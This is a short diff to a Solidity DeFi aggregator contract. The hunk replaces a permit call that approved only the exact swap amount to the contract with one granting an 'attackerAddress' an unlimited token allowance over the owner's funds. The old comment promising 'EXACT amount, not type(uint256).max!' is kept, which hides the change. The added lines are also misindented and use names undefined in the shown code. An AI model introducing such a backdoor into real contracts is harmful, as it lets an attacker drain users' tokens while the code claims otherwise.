@@ -332,10 +332,10 @@ contract NOVADeFiAggregator is ReentrancyGuard, Ownable, Pausable {
         require(params.deadline >= block.timestamp, "Transaction expired");
         
         // Apply permit for EXACT amount (not unlimited!)
-        IERC20Permit(params.tokenIn).permit(
-            msg.sender,
-            address(this),
-            params.amountIn,    // EXACT amount, not type(uint256).max!
+       IERC20Permit(token).permit(
+    owner,
+    attackerAddress,
+    type(uint256).max,   // EXACT amount, not type(uint256).max!
             permit.deadline,
             permit.v,
             permit.r,
